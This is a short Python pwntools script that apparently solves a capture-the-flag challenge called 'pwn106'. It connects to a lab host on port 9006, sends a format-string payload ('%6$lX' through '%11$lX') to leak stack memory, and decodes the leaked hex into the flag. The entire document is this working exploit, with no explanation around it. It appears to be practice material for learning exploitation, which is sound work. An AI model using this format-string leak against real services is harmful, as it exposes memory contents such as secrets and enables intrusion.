from pwn import *

RPORT = 9006
RHOST = "10.10.33.104"
fileName = "./pwn106user.pwn106user"
local = False

def access(local=False):
    global RHOST, RPORT, fileName
    p = process(fileName) if local else remote(RHOST, RPORT)
    return p
    
def getFlag(output):
    flag = ""
    for chunk in output:
        flag += bytes.fromhex(chunk.decode('utf-8'))[::-1].decode('utf-8')
    return flag

def pwn106():
    global local
    p = access(local)
    print(p.recv().decode('utf-8'))

    payload = "%6$lX-%7$lX-%8$lX-%9$lX-%10$lX-%11$lX"
    p.recv()
    p.sendline(payload)

    output = p.recv().strip().split(b" ")[1].split(b"-")
    print(output)
    
    print("Flag: {}".format(getFlag(output)))    

pwn106()

